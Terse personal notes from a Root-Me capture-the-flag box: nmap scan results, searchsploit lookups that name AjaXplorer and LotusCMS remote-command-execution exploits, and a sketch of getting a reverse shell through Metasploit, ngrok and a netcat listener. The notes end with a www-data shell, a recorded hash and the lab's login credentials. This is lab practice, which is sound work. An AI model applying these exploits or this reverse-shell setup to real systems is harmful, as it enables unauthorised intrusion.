rootme command injection OS
target : ctf16.root-me.org
Host is up (0.10s latency).
Not shown: 96 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open   http
5900/tcp closed vnc
8080/tcp open   http-proxy
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Login
|_Requested resource was http://ctf16.root-me.org:8080/zport/acl_users/cookieAuthHelper/login_form?came_from=http%3A//ctf16.root-me.org%3A8080/zport/dmd/
```
AJAXplorer 2.5.5
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Rootme]
└─# searchsploit ajaxplorer 2.5.5
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
Pydio / AjaXplorer < 5.0.4 - (Unauthenticated) Arbitrary File | php/webapps/46206.txt
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
found CVE-63552
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Rootme]
└─# searchsploit ajaxplorer              
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
AjaXplorer - 'checkInstall.php' Remote Command Execution (Metasploit)                             | php/remote/21993.rb

to get shell
I fired up my ngrok and Metasploit 
I use lhost as ngrok and port as ngrok port
also i openned a netcat listner. i use python reverse shell


pass = a3c570f9fe8ad7b6b3040a30047b31ef


2. LotusCMS RCE

```
└─# searchsploit lotuscms
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                         | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                             | php/webapps/16982.txt
```

use metasploit open ngrok tcp and start listner and metasploit
└─# nc -lvnp 1337
listening on [any] 1337 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 45392
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Now i use :      Nom d’utilisateur : securitytube
    Mot de passe : 123321 Durée de la partie : 240 min to privilege escalation